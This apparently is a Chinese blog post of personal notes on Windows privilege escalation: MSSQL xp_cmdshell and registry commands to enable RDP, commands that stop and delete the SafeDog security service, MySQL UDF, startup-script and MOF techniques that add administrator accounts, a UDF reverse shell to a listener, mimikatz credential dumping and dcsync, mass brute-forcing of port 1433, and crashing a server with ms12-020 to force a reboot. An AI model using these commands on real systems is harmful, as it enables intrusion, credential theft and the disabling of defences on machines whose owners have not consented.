@@ -1,0 +1,566 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 提权2</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>提权<hanla></hanla>2 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/11
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/提权篇">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                提权篇
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="带有高权限的web容器及中间件"><a href="#带有高权限的web容器及中间件" class="headerlink" title="带有高权限的web容器及中间件"></a><hanla></hanla>带有高权限的<hanla></hanla>web<hanla></hanla>容器及中间件</h2><span id="more"></span>
+
+<p><hanla></hanla>winmail server<br>phpstudy<br>wamp<br>upupw<br>tomcat<br>Strus2<br><hanla></hanla>java<hanla></hanla>反序列漏洞  </p>
+<p>1.tomcat  jsp<br>iis<br>apache  </p>
+<p>sqlserver<br>mysql  </p>
+<p>前提条件；<br><hanla></hanla>1.<hanla></hanla>拥有数据库管理员账号密码权限<br><hanla></hanla>2.windows  系统下 （没有被降权）<br><hanla></hanla>zkeys  mysql  宝塔<hanla></hanla>(集成环境)  </p>
+<p><hanla></hanla>linux  下<hanla></hanla>mysql<hanla></hanla>的<hanla></hanla>root<hanla></hanla>权限是服务用户权限  很小  不能提权  </p>
+<h2 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a><hanla></hanla>mssql<hanla></hanla>提权</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37077262/article/details/102964050"><hanla></hanla>https://blog.csdn.net/qq_37077262/article/details/102964050</a></p>
+<p>安装组件<br><hanla></hanla>开启<hanla></hanla>3389<br><hanla></hanla>创建用户<br>提升权限  </p>
+<p>sqlserver<br><hanla></hanla>sa<hanla></hanla>账号获取：<br><hanla></hanla>1.<hanla></hanla>爆破<br><hanla></hanla>2.<hanla></hanla>查找网站源码数据库链接文件 （web.config  /conn.asp/aspx  config.asp/  aspx  dbconfig.asp/aspx)<br>sa<br><hanla></hanla>xycms  (不是<hanla></hanla>sa,<hanla></hanla>并不代表不是<hanla></hanla>sa<hanla></hanla>权限）<br><hanla></hanla>如果有注入  sqlmap  –is-dba 是<hanla></hanla>sa<br>sa 登录外部地址<br><hanla></hanla>1433 抓鸡批量抓一个网段，找<hanla></hanla>1433<hanla></hanla>端口的，爆破，sa<hanla></hanla>就能提权<br><hanla></hanla>sa   </p>
+<p>mysql  root 账号默认不允许外部地址登录  </p>
+<p>提权工具，假设我们知道连接账号  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwceEi"><img src="https://s3.jpg.cm/2021/10/11/IwceEi.png" alt="IwceEi.png"></a></p>
+<p><hanla></hanla>mssql<hanla></hanla>安装执行命令组件<br><hanla></hanla>这里不能使用<hanla></hanla>xp_cmdshell<hanla></hanla>的存储过程的话可以使用<hanla></hanla>sql<hanla></hanla>查询分析器，这个工具好像不能  在<hanla></hanla>windows10<hanla></hanla>里面用</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc7xw"><img src="https://s3.jpg.cm/2021/10/11/Iwc7xw.png" alt="Iwc7xw.png"></a></p>
+<p>能操作这几个数据库侧面也可以看出他是管理员</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc5wO"><img src="https://s3.jpg.cm/2021/10/11/Iwc5wO.png" alt="Iwc5wO.png"></a></p>
+<p>然后在执行就可以了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcljk"><img src="https://s3.jpg.cm/2021/10/11/Iwcljk.png" alt="Iwcljk.png"></a></p>
+<p><hanla></hanla>安装<hanla></hanla>cmd_shell<hanla></hanla>组件</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+ EXEC sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+</code></pre>
+<p><hanla></hanla>删除<hanla></hanla>cmd_shell<hanla></hanla>组件</p>
+<pre><code> EXEC sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXEC sp_configure 'xp_cmdshell', 0
+GO
+RECONFIGURE
+GO
+</code></pre>
+<p><hanla></hanla>3389<hanla></hanla>操作语句</p>
+<pre><code><hanla></hanla>开启<hanla></hanla>3389
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
+
+关闭<hanla></hanla>3389
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;
+</code></pre>
+<p>绕过安全狗提权</p>
+<pre><code><hanla></hanla>system<hanla></hanla>权限的情况下：
+net stop "safedog guard center" /y
+net stop "safedog update center" /y
+net stop "safedogguardcenter" /y
+删除安全狗服务：
+sc stop "SafeDogGuardCenter"
+sc config "SafeDogGuardCenter" start=disabled
+sc delete "Safedogguardcenter"
+
+
+sc stop "SafeDogupdateCenter"
+sc config "SafeDogUpdateCenter" start=disabled
+sc delete "SafedogUpdatecenter"
+
+
+sc stop "SafeDogCloudHeler"
+sc config "SafeDogCloudHeler" start=disabled
+sc delete "SafeDogCloudHeler"
+</code></pre>
+<p>禁用安全狗但是要重启<br>如果有安全狗，不能直接添加到管理员组，我们可以添加到远程桌面组<br><hanla></hanla>remote desktop users<br><hanla></hanla>但是我们登录进去也还是普通用户<br>但是有些铭感目录依然无法访问，我们可以使用命令对文件进行降权<br><hanla></hanla>cacls d: /e /t /g everyone :F  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcd68"><img src="https://s3.jpg.cm/2021/10/11/Iwcd68.png" alt="Iwcd68.png"></a></p>
+<p>xiaxiang.exe  这个不行了</p>
+<p><hanla></hanla>如果<hanla></hanla>sqlserver 站酷分离不允许外部地址链接<br><hanla></hanla>上那个可以执行命令的<hanla></hanla>aspx<hanla></hanla>的马<br><hanla></hanla>用<hanla></hanla>localhost<hanla></hanla>去连  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcV5e"><img src="https://s3.jpg.cm/2021/10/11/IwcV5e.png" alt="IwcV5e.png"></a></p>
+<p><hanla></hanla>上面那种开启<hanla></hanla>xp_cmdshell<hanla></hanla>不行可以用下面这个语句</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc8ty"><img src="https://s3.jpg.cm/2021/10/11/Iwc8ty.png" alt="Iwc8ty.png"></a></p>
+<h2 id="Mysql数据库提权"><a href="#Mysql数据库提权" class="headerlink" title="Mysql数据库提权"></a><hanla></hanla>Mysql<hanla></hanla>数据库提权</h2><p><hanla></hanla>udf<hanla></hanla>提权<br>启动项提权<br><hanla></hanla>mof<hanla></hanla>提权<br>反连端口提权  </p>
+<p><hanla></hanla>获取到对方的<hanla></hanla>mysql<hanla></hanla>数据库下的<hanla></hanla>root<hanla></hanla>账号密码<br><hanla></hanla>1.<hanla></hanla>查看网站源码里面数据库配置文件（inc,conn,config.sql,common,data<hanla></hanla>等）<br>分析网站属性：<br>阿里云虚拟机站（虚拟机会根据不同的站点创建不同的数据库用户链接数据库）<br>如果是企业自己服务器，站点不多，九阳家电（单个服务器，单个站点或者一个企业属性站点）<br><hanla></hanla>我们得到的账号不是<hanla></hanla>root   并不代表它就不是<hanla></hanla>root<hanla></hanla>权限（可以链接查看能获取<hanla></hanla>mysql<hanla></hanla>操纵一般就是管理员）  </p>
+<p><hanla></hanla>2.<hanla></hanla>暴力破解 mysql<hanla></hanla>密码破解 3306<hanla></hanla>端口入侵  </p>
+<p><hanla></hanla>爆破，只能爆<hanla></hanla>127<hanla></hanla>或者<hanla></hanla>localhost<br><hanla></hanla>可以用大马爆破<br>字典是逗号分隔开的，可以用批量替换<br>在压缩包大马–testa.php  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwccL5"><img src="https://s3.jpg.cm/2021/10/11/IwccL5.png" alt="IwccL5.png"></a></p>
+<p>   还可以用脱裤脚本来爆破<br><hanla></hanla>burp<hanla></hanla>抓个包直接爆破就行了  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcA0r"><img src="https://s3.jpg.cm/2021/10/11/IwcA0r.png" alt="IwcA0r.png"></a></p>
+<p><hanla></hanla>3.<hanla></hanla>查看数据库安装路径下的<hanla></hanla>user.myd  (/data/mysql/)<hanla></hanla>下载，本地替换<br><hanla></hanla>mysqld –skip-grant-tables 跳过验证<br><hanla></hanla>mysql.exe -uroot    进入<hanla></hanla>MySQL<br><hanla></hanla>mysql<hanla></hanla>数据表由三个构成<br><hanla></hanla>具体数据就在<hanla></hanla>MYD<hanla></hanla>中  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcUUC"><img src="https://s3.jpg.cm/2021/10/11/IwcUUC.png" alt="IwcUUC.png"></a></p>
+<p><hanla></hanla>a.<hanla></hanla>可以直接下载这个文件读取<br>可以直接菜刀链接，一般网站都可以下载这个数据库的文件</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcELp"><img src="https://s3.jpg.cm/2021/10/11/IwcELp.png" alt="IwcELp.png"></a></p>
+<p>打开，encoding=’utf-8’</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcFb6"><img src="https://s3.jpg.cm/2021/10/11/IwcFb6.png" alt="IwcFb6.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcS54"><img src="https://s3.jpg.cm/2021/10/11/IwcS54.png" alt="IwcS54.png"></a></p>
+<p>那要是解不开咋整，或者得到的密文等录不进去<br>可以把这三个都下载下来，本地搭建一个，备份自己的这三个文件，然后用他的文件替换过来<br><hanla></hanla>替换后密码变成它的了，windows10<hanla></hanla>不行但是<hanla></hanla>windows2008<hanla></hanla>可以执行这条命令</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcYNX"><img src="https://s3.jpg.cm/2021/10/11/IwcYNX.png" alt="IwcYNX.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwctyG"><img src="https://s3.jpg.cm/2021/10/11/IwctyG.png" alt="IwctyG.png"></a></p>
+<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a><hanla></hanla>udf<hanla></hanla>提权</h3><p><hanla></hanla>C:\Winnt\udf.dll    2000<br>C:\Windows\udf.dll 2003<br><hanla></hanla>现在基本上<hanla></hanla>win<hanla></hanla>的服务器就这两个导出<hanla></hanla>UDF.DLL<br><hanla></hanla>5.1<hanla></hanla>以上版本需要导出到<hanla></hanla>mysql<hanla></hanla>安装目录<hanla></hanla>lib\plugin\<br>create function cmdshell returns string soname ‘udf.dll’<br>select cmdshell(‘net user cracer cracer /add’);<br>select cmdshell(‘net localgroup administrators cracer /add’);<br>drop function cmdshell; 删除函数  </p>
+<p><hanla></hanla>udf<hanla></hanla>提权原理：<br><hanla></hanla>通过<hanla></hanla>root<hanla></hanla>权限导出<hanla></hanla>udf.dll<hanla></hanla>到系统目录下，可以通过<hanla></hanla>udf.dll<hanla></hanla>调用执行<hanla></hanla>cmd  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcr0D"><img src="https://s3.jpg.cm/2021/10/11/Iwcr0D.png" alt="Iwcr0D.png"></a></p>
+<p><hanla></hanla>用菜刀把<hanla></hanla>toolsudf<hanla></hanla>传上去<br><hanla></hanla> 5.1<hanla></hanla>以下导在<hanla></hanla>c<hanla></hanla>盘<hanla></hanla>windows<hanla></hanla>目录下，5.1<hanla></hanla>以上导在<hanla></hanla>mysql,lib\\plugin\\udf.dll<br><hanla></hanla>创建<hanla></hanla>plugin<hanla></hanla>目录，这个非常好用，但是我寻思这不是有木马自己新建一个也可以鸭    </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwckoT"><img src="https://s3.jpg.cm/2021/10/11/IwckoT.png" alt="IwckoT.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcvVQ"><img src="https://s3.jpg.cm/2021/10/11/IwcvVQ.png" alt="IwcvVQ.png"></a></p>
+<p>创建的时候要注意，报错可能是密码不符合规则</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcwFh"><img src="https://s3.jpg.cm/2021/10/11/IwcwFh.png" alt="IwcwFh.png"></a></p>
+<p><hanla></hanla>如果此时用<hanla></hanla>msf<hanla></hanla>生成一个<hanla></hanla>payload<br><hanla></hanla>运行后是<hanla></hanla>system<hanla></hanla>权限</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcmDE"><img src="https://s3.jpg.cm/2021/10/11/IwcmDE.png" alt="IwcmDE.png"></a></p>
+<p>这样运行注意不能反弹，会被转义，必须这样写<br><hanla></hanla>c:\\inetput\\wwwroot\\1.exe<br>c:/inetput/wwwroot//1.exe(或者反斜杠)<br><hanla></hanla>还可以应用另一个脚本    </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc0PL"><img src="https://s3.jpg.cm/2021/10/11/Iwc0PL.png" alt="Iwc0PL.png"></a></p>
+<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><pre><code><hanla></hanla> 1、查看我们进入数据库中有些什么数据表
+mysql&gt;show tables;
+默认的情况下，test<hanla></hanla>中没有任何表的存在。
+以下为关键的部分
+2、在<hanla></hanla>TEST<hanla></hanla>数据库下创建一个新的表；
+mysql&gt;create table a (cmd text);
+好了，我们创建了一个新的表，表名为<hanla></hanla>a，表中只存放一个字段，字段名为<hanla></hanla>cmd，为<hanla></hanla>text<hanla></hanla>文本。
+3、在表中插入内容
+mysql&gt;insert into a values ("set wshshell=createobject (""wscript.shell"")")
+;
+mysql&gt;insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1 /add"",0)");
+mysql&gt;insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0)");
+注意双引号和括号以及后面的<hanla></hanla>“0”<hanla></hanla>一定要输入！我们将用这三条命令来建立一个<hanla></hanla>VBS<hanla></hanla>的脚本程序！
+4、好了，现在我们来看看表<hanla></hanla>a<hanla></hanla>中有些什么
+mysql&gt;select * from a;
+我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步
+5、输出表为一个<hanla></hanla>VBS<hanla></hanla>的脚本文件
+mysql&gt;select * from a into outfile "c://docume~1//administrator//「开始」菜单<hanla></hanla>//<hanla></hanla>程序<hanla></hanla>//<hanla></hanla>启动<hanla></hanla>//a.vbs";
+6.<hanla></hanla>重启即可！
+可是管理员不启动怎么办
+ms12-020（让它蓝屏
+</code></pre>
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a><hanla></hanla>mof<hanla></hanla>提权</h3><p><hanla></hanla>利用了<hanla></hanla>c:/windows/system32/wbem/mof/<hanla></hanla>目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们<br><hanla></hanla>的<hanla></hanla>cmd<hanla></hanla>命令使其被带入执行。<br><hanla></hanla>使用<hanla></hanla>MOF<hanla></hanla>提权的前提是当前<hanla></hanla>root<hanla></hanla>账户可以复制文件到<hanla></hanla>%SystemRoot%\System32\Wbem\MOF<hanla></hanla>目录下。  </p>
+<pre><code><hanla></hanla>第一种方法：
+上传<hanla></hanla>mof.php
+输入相关信息，执行命令，提权。
+第二种方法:
+上传文件<hanla></hanla>x.mof
+使用<hanla></hanla>select<hanla></hanla>命令导出入到正确位置
+select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
+这个上传上去后会每隔五分钟创建一次
+
+允许外部地址使用<hanla></hanla>root<hanla></hanla>用户连接的<hanla></hanla>sql<hanla></hanla>语句
+Grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcB7W"><img src="https://s3.jpg.cm/2021/10/11/IwcB7W.png" alt="IwcB7W.png"></a></p>
+<p>这个脚本可能一次执行不成功，多试几次，玄学。。。</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc2bf"><img src="https://s3.jpg.cm/2021/10/11/Iwc2bf.png" alt="Iwc2bf.png"></a></p>
+<h3 id="反链端口提权"><a href="#反链端口提权" class="headerlink" title="反链端口提权"></a>反链端口提权</h3><p><hanla></hanla>利用<hanla></hanla>mysql<hanla></hanla>客户端工具连接<hanla></hanla>mysql<hanla></hanla>服务器，然后执行下面的操作。<br>执行命令<br><hanla></hanla>mysql.exe -h 172.16.10.11 -uroot -p<br>Enter password:<br>mysql&gt; . c:\mysql.txt<br>mysql&gt;select backshell(“YourIP”,2010);  </p>
+<p>2、本地监听你反弹的端口  </p>
+<p>nc.exe -vv -l -p 2010  </p>
+<p><hanla></hanla>成功后，你将获得一个<hanla></hanla>system<hanla></hanla>权限的<hanla></hanla>cmdshell，其实这个也是利用的<hanla></hanla>UDF<hanla></hanla>提权  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcg2H"><img src="https://s3.jpg.cm/2021/10/11/Iwcg2H.png" alt="Iwcg2H.png"></a></p>
+<p><hanla></hanla>提交<hanla></hanla>udf<br><hanla></hanla>创建反弹函数<br>执行反弹函数  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcfN2"><img src="https://s3.jpg.cm/2021/10/11/IwcfN2.png" alt="IwcfN2.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwc34U"><img src="https://s3.jpg.cm/2021/10/11/Iwc34U.png" alt="Iwc34U.png"></a></p>
+<p><hanla></hanla>买个<hanla></hanla>vps<hanla></hanla>吧 ，<br><hanla></hanla>用这个<hanla></hanla>nc  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwcCDO"><img src="https://s3.jpg.cm/2021/10/11/IwcCDO.png" alt="IwcCDO.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwchVw"><img src="https://s3.jpg.cm/2021/10/11/IwchVw.png" alt="IwchVw.png"></a></p>
+<h2 id="哈希获取与破解"><a href="#哈希获取与破解" class="headerlink" title="哈希获取与破解"></a>哈希获取与破解</h2><p>提权不多，内网比较多<br><hanla></hanla>需要管理员权限方可执行读取<hanla></hanla>hash<hanla></hanla>操作<br><hanla></hanla>gethashes.exe  $local<br>gsecdump<br>-h  显示帮助<br>-a  获取所有密码信息<br><hanla></hanla>-s 从<hanla></hanla>sam<hanla></hanla>文件和域控中获取<hanla></hanla>hash<hanla></hanla>值<br><hanla></hanla>-u 获取当前登录用户的<hanla></hanla>hash<br>-w  获取无线密码  </p>
+<p><hanla></hanla>pwdump7.exe<hanla></hanla>获取<hanla></hanla>hash  </p>
+<p>sam(windows)<br>/etc/shadow<br>administrator<br>safedog<br>minikatz.ps1<br><hanla></hanla>抓取<hanla></hanla>hash<br><hanla></hanla>本地破解<br><hanla></hanla>cmd5<hanla></hanla>破解<br><hanla></hanla>pth<hanla></hanla>攻击  pass  the hash 传递哈希攻击<br><hanla></hanla>不需要明文密码，直接用<hanla></hanla>hash<hanla></hanla>登录  </p>
+<p>windows 10<br>windows server2012 不能读明文了  </p>
+<h2 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a><hanla></hanla>mimikatz<hanla></hanla>使用</h2><p><hanla></hanla>mimikatz<hanla></hanla>使用时需要高权限，至少是<hanla></hanla>administrator<hanla></hanla>权限<br><hanla></hanla>mimikatz<hanla></hanla>抓取密码的命令需要<hanla></hanla>system<hanla></hanla>权限，可以先进行提权<br><hanla></hanla>privilege::debug  //<hanla></hanla>提升权限（从<hanla></hanla>administrator<hanla></hanla>提升到<hanla></hanla>system）<br><hanla></hanla>抓取<hanla></hanla>hash<br><hanla></hanla>sekurlsa::logonpasswords   //<hanla></hanla>获取当前在线用户的明文密码（需要高权限运行）<br><hanla></hanla>lsadump::lsa /patch   //<hanla></hanla>获取当前此计算机存在过用户的<hanla></hanla>NTLMHASH<br><hanla></hanla>mimikatz<hanla></hanla>的其他命令<br><hanla></hanla>lsadump::sam SYSTEM.hiv //<hanla></hanla>导出所有用户口令 使用<hanla></hanla>Volue Shadow   Copy<hanla></hanla>获得<hanla></hanla>SYSTEM、SAM<hanla></hanla>备份<br>通过内存文件获取口令<br><hanla></hanla>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br><hanla></hanla>拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据<br><hanla></hanla>lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt<br><hanla></hanla>拉取 lab.adsecurity.org 域中 ADSDC03 域控制器的计算机帐户的密码数据<br><hanla></hanla>lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$  </p>
+<p><hanla></hanla>破解<hanla></hanla>hash<hanla></hanla>提权<br><hanla></hanla>hash<hanla></hanla>破解工具：<br>saminside<br>oclhashcat<br>LC5<br>Ophcrack<br>john the Ripper  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcjk8"><img src="https://s3.jpg.cm/2021/10/11/Iwcjk8.png" alt="Iwcjk8.png"></a>  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwcyyi"><img src="https://s3.jpg.cm/2021/10/11/Iwcyyi.png" alt="Iwcyyi.png"></a></p>
+<p><hanla></hanla>lc5<hanla></hanla>可以读取<hanla></hanla>hash<br><hanla></hanla>面向百度渗透</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwb9zy"><img src="https://s3.jpg.cm/2021/10/11/Iwb9zy.png" alt="Iwb9zy.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwbyte"><img src="https://s3.jpg.cm/2021/10/11/Iwbyte.png" alt="Iwbyte.png"></a></p>
+<h2 id="漏洞利用提权"><a href="#漏洞利用提权" class="headerlink" title="漏洞利用提权"></a>漏洞利用提权</h2><p>补丁提取<br><hanla></hanla>wmic qfe get Caption,description,hotfixid,installedon  </p>
+<p>利用补丁提取脚本  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iwbjnk"><img src="https://s3.jpg.cm/2021/10/11/Iwbjnk.png" alt="Iwbjnk.png"></a></p>
+<p><hanla></hanla>如果菜刀连不上  php/ 5.2.17<hanla></hanla>默认开启魔术引号</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbKhi"><img src="https://s3.jpg.cm/2021/10/11/IwbKhi.png" alt="IwbKhi.png"></a></p>
+<p>可以用过狗狗菜刀  </p>
+<p>搜索漏洞常用网站<br><a target="_blank" rel="noopener" href="https://exploit-db.com/"><hanla></hanla>https://exploit-db.com</a><br><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a><br><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/search/?q=ms15-057">https://packetstormsecurity.com/search/?q=ms15-057</a><br><a target="_blank" rel="noopener" href="https://www.securityfocus.com/">https://www.securityfocus.com/</a><br><a target="_blank" rel="noopener" href="https://www.securityfocus.com/bid">https://www.securityfocus.com/bid</a><br><a target="_blank" rel="noopener" href="http://1337day.com/">http://1337day.com</a><br><a target="_blank" rel="noopener" href="http://0day.today/">http://0day.today</a><br><a target="_blank" rel="noopener" href="http://seclists.org/fulldisclosure">http://seclists.org/fulldisclosure</a><br><a target="_blank" rel="noopener" href="http://exploitsearch.net/">http://exploitsearch.net</a><br><a target="_blank" rel="noopener" href="http://www.securiteam.com/">http://www.securiteam.com</a><br><a target="_blank" rel="noopener" href="http://metasploit.com/modules">http://metasploit.com/modules</a><br><a target="_blank" rel="noopener" href="http://securityreason.com/">http://securityreason.com</a><br><a target="_blank" rel="noopener" href="https://cxsecurity.com/exploit">https://cxsecurity.com/exploit</a><br><a target="_blank" rel="noopener" href="http://securitytracker.com/">http://securitytracker.com</a>  </p>
+<h3 id="提权辅助工具windows-exploit-suggester"><a href="#提权辅助工具windows-exploit-suggester" class="headerlink" title="提权辅助工具windows-exploit-suggester"></a><hanla></hanla>提权辅助工具<hanla></hanla>windows-exploit-suggester</h3><p><hanla></hanla>使用方法：<br>windows-exploit-suggester.py –update<br><hanla></hanla>将服务器执行<br><hanla></hanla>systeminfo &gt; a.txt<br>windows-exploit-suggester.py –database 2019-01-01-mssb.xls   –systeminfo a.txt<br>windows-exploit-suggester.py –audit –database 2019-01-01-mssb.xls   –systeminfo a.txt<br>windows-exploit-suggester.py –audit  -l –database   2019-01-01-mssb.xls –systeminfo a.txt  </p>
+<p><hanla></hanla>首先使用<hanla></hanla>systeminfo 获取主机的补丁信息<br><hanla></hanla>保存到一个<hanla></hanla>08.txt<hanla></hanla>中  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbCE8"><img src="https://s3.jpg.cm/2021/10/11/IwbCE8.png" alt="IwbCE8.png"></a></p>
+<p>这有一篇文章可以看一下如何使用<br><hanla></hanla>python2&nbsp;-m pip install xlrd==1.2.0<br><hanla></hanla>使用命令更新漏洞库<br><hanla></hanla>windows-exploit-suggester.py –update  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbaIr"><img src="https://s3.jpg.cm/2021/10/11/IwbaIr.png" alt="IwbaIr.png"></a></p>
+<p>进行漏洞对比<br><hanla></hanla>windows-exploit-suggester.py –database 2021-10-06-mssb.xls   –systeminfo 08.txt  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbiU5"><img src="https://s3.jpg.cm/2021/10/11/IwbiU5.png" alt="IwbiU5.png"></a></p>
+<p><hanla></hanla>一般<hanla></hanla>windows2003 提权一般用<hanla></hanla>2018-8120<br><hanla></hanla>这里也可以使用<hanla></hanla>pr<hanla></hanla>提权</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IwbxwC"><img src="https://s3.jpg.cm/2021/10/11/IwbxwC.png" alt="IwbxwC.png"></a></p>
+<p><hanla></hanla>我提权失败了，提示不能设置<hanla></hanla>Could not set registry values 无法设置注册表值<br><hanla></hanla>测试了<hanla></hanla>ms16-032 失败<br><hanla></hanla>ms15-051 卡住了  </p>
+<h3 id="溢出提权"><a href="#溢出提权" class="headerlink" title="溢出提权"></a>溢出提权</h3><pre><code><hanla></hanla>找到未打补丁的漏洞编号
+poc.exe muma.exe   以管理员身份运行远控木马
+poc.exe “whoami”<hanla></hanla>查看执行身份权限
+poc.exe “net user x 123.com /add”
+poc.exe “net localgroup administrators x /add”
